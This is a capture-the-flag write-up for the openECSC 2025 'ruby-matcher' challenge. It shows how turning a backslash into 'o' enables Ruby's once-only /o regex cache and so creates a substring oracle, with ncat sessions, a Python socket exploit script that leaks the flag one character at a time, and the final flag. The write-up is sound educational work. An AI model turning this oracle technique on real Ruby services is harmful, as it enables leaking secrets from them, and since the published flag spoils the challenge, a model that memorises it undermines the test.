# openECSC 2025

## Challenge: ruby-matcher

## Tags: misc

## Difficulty: Medium

## Table of Contents

- [Solution Overview](#solution-overview)
- [Tools Used](#tools-used)
- [Solution](#solution)
- [Flag](#flag)

### Solution Overview

This challenge allows you to change exactly one character in Ruby code that uses regex matching. The vulnerability lies in the fact that you can change the backslash (`\`) before `#{@search}` in the regex `/\#{@search}/` to the character `o`, creating `/#{@search}/o)`. This achieves two things simultaneously: (1) removes the escape character, enabling Ruby string interpolation, and (2) adds the `/o` modifier which makes regex compilation happen only once and cache the pattern. By exploiting the `/o` modifier, the flag check reuses our controlled search pattern instead of a random letter, turning it into a substring oracle that leaks the flag character by character.

### Tools Used

- Python 3 with `socket` and `ssl` libraries
- Ruby for local testing
- ncat with SSL support for manual testing

### Solution

#### Initial Analysis

When I first looked at the challenge, I was presented with this Ruby code:

```ruby
code = "
class Matcher
  def initialize( search )
    @search = search
  end

  def change_search( new_search )
    @search = Regexp.escape( new_search )
  end

  def not_matches?( input )
    return !input.match?( /\#{@search}/ )
  end

  def matches?( input )
    return !self.not_matches?( input )
  end
end"
```

The challenge statement was simple: **"You can change just one character and run a regex, surely it must be safe... right?"**

The program flow:
1. Choose an index to change one character
2. Choose what character to replace it with
3. The code gets evaluated
4. You provide a search string (which gets `Regexp.escape()`'d)
5. You provide a target string to match against
6. The program tests a random letter against the flag and prints the result

**Initial thought**: "How can changing one character help me leak the flag when my search string is escaped?"

#### Finding the Pieces

##### Piece 1: The Escaped Interpolation

The key line is:

```ruby
return !input.match?( /\#{@search}/ )
```

Notice the `\#` — this **escapes** the `#` character, preventing Ruby's string interpolation. So even though `@search` contains user input, it's treated as literal text `#{@search}` in the regex, not as variable interpolation.

**First roadblock**: Even if I control `@search`, it won't interpolate because of that backslash. ❌

##### Piece 2: The One Character Change

I can change **exactly one character** in the code. What if I change that backslash?

```ruby
# Original:
/\#{@search}/

# If I change '\' at index 219 to... nothing? Space? Another character?
```

**Wait.** I can't "remove" a character, only change it. What if I change `\` to something else?

Let me test locally what happens if I change `\` to a space:

```ruby
/ #{@search}/   # Interpolation enabled! But no special modifier
```

This enables interpolation, but I still need the search pattern to be reused by the flag check...

##### Piece 3: The /o Modifier — "Oh the humanity!"

Then it hit me: **What if the character I'm changing can serve double duty?**

Looking at the line more carefully:

```ruby
return !input.match?( /\#{@search}/ )
                      ^           ^^
                      |           ||
                   opening    closing + space + paren
```

If I change the `\` to `o`, it becomes:

```ruby
return !input.match?( /#{@search}/o)
```

**Two birds, one stone**:
1. Removes the escape, enabling interpolation
2. Adds the `/o` modifier after the closing `/`

#### The /o Modifier Magic

Ruby's `/o` modifier means **"interpolate only once"**. The regex is compiled with the **first** value that gets interpolated, and then that compiled pattern is **cached and reused** for all subsequent matches!

**Test this locally**:

```ruby
# Change index 219 to 'o'
m1 = Matcher.new("ABC")  # Compiles regex /ABC/o
puts m1.matches?("ABCDEF")  # true - matches!
puts m1.matches?("XYZ")     # false - doesn't match

m2 = Matcher.new("X")       # Should compile /X/o... but wait!
puts m2.matches?("ABCDEF")  # true - STILL uses /ABC/o !!! 
puts m2.matches?("XYZ")     # false - STILL uses /ABC/o !!!
```

**BINGO!** 

The `/o` modifier means that `m2` **reuses the cached pattern from `m1`**, even though it was initialized with a different search string!

#### The Exploit Chain

Here's how the exploit works:

1. **Change index 219** (the `\` before `#{@search}`) to `o`
   - This creates: `/#{@search}/o)`
   
2. **Provide our search string**: `openECSC{a`
   - First call to `Matcher.new(search)` compiles regex `/openECSC{a/o`
   - This pattern gets **cached**

3. **The flag check**: `Matcher.new(letter).not_matches?(flag)`
   - Creates a new Matcher with a random letter
   - But `/o` modifier makes it **reuse our cached pattern**!
   - It actually tests if `flag.match?(/openECSC{a/)` instead of `flag.match?(/[random_letter]/)`

4. **Read the result**:
   - `not_matches?` returns `false` → Pattern matched → `a` is the next character! ✅
   - `not_matches?` returns `true` → Pattern didn't match → Try next character

**It's a substring oracle!** I can leak the flag character by character.

#### Manual Verification

Let me test this manually:

```bash
$ ncat --ssl <host> 31337
Index? 219
Character? o
Search string? openECSC{
Target string? test
Result: false
Now I will test my flag: false  # Match! Flag starts with "openECSC{"
```

```bash
$ ncat --ssl <host> 31337
Index? 219
Character? o
Search string? openECSC{X
Target string? test
Result: false
Now I will test my flag: true   # No match! Not 'X'
```

**Perfect!** The exploit works. Now I just need to automate it.

#### Building the Exploit Script

The Python script needs to:
1. Connect via SSL
2. Send index `219` and character `o`
3. Send search pattern `known_flag + test_char`
4. Send dummy target string
5. Parse the flag check result (`false` = match, `true` = no match)
6. Repeat for each character until we find `}`

**Initial attempts failed** because:
- ❌ Timing issues with `recv()` cutting off output
- ❌ Charset too small, missing special characters like `:`, `/`, `.`

**Final working exploit**:

```python
def exploit_character(host, port, known_flag, test_char):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as raw_sock:
        with context.wrap_socket(raw_sock, server_hostname=host) as sock:
            recv_until(sock, "Index?")
            send_line(sock, "219")
            recv_until(sock, "Character?")
            send_line(sock, "o")
            recv_until(sock, "Search string?")
            
            # Test prefix + new character
            send_line(sock, known_flag + test_char)
            recv_until(sock, "Target string?")
            send_line(sock, "test")
            
            # Read until we get the flag check line
            full_output = b""
            while b"Now I will test my flag:" not in full_output:
                full_output += sock.recv(1024)
            time.sleep(0.2)
            full_output += sock.recv(1024)
            
            # Extract result
            output_text = full_output.decode()
            lines = output_text.strip().split("\n")
            last_line = lines[-1]
            
            if "Now I will test my flag:" in last_line:
                result = last_line.split("Now I will test my flag:")[-1].strip()
            else:
                result = last_line.strip()
            
            return result == "false"  # false = match!
```

**Character set** (expanded to include URL characters):

```python
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_!@#$-./:="
```

#### Running the Exploit

```bash
$ python3 exploit_o_modifier.py
[*] Starting flag extraction...
[*] Known prefix: openECSC{

[+] MATCH! Character 'C' is correct!
[+] Current flag: openECSC{C

[+] MATCH! Character 'o' is correct!
[+] Current flag: openECSC{Co

[+] MATCH! Character 'n' is correct!
[+] Current flag: openECSC{Con

[+] MATCH! Character 'g' is correct!
[+] Current flag: openECSC{Cong

...

[+] Current flag: openECSC{Congrats!_https://jpcamara.com

...
```

At this point, I visited the URL and found an article titled:

> **"The /o in Ruby regex stands for 'oh the humanity!'"**

The article explained this exact vulnerability! The URL was the rest of the flag.

**Final flag**: `openECSC{Congrats!_https://jpcamara.com/2025/08/02/the-o-in-ruby-regex.html}`

### Flag

**`openECSC{Congrats!_https://jpcamara.com/2025/08/02/the-o-in-ruby-regex.html}`**
